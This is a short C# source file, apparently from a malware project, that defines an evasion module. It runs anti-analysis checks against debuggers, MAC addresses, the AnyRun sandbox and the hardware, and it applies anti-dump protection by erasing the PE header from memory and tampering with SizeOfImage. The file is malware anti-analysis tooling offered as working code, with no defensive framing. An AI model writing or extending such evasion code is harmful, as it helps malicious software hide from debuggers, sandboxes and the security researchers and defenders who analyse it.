using LannEvasion.Checks;
using LannLogger;
using Serilog.Core;

namespace LannEvasion; 

public static class Evasion {
    private static Logger Logger = LoggerFactory.CreateLogger("Evasion");
    
    private static List<Check> Checks = new() {
        new AntiDebug(),
        new Mac(),
        new AnyRun(),
        new Hardware()
    };
    
    public static async Task<bool> RunCheck() {
        Logger.Information("Running evasion check");

        foreach (Check check in Checks) {
            if (await check.Run()) return true;
        }

        return false;
    }

    public static async Task Protect() {
        Logger.Information("Injecting AntiDump");

        AntiDump.ErasePEHeaderFromMemory();
        AntiDump.SizeOfImage();
    }
}
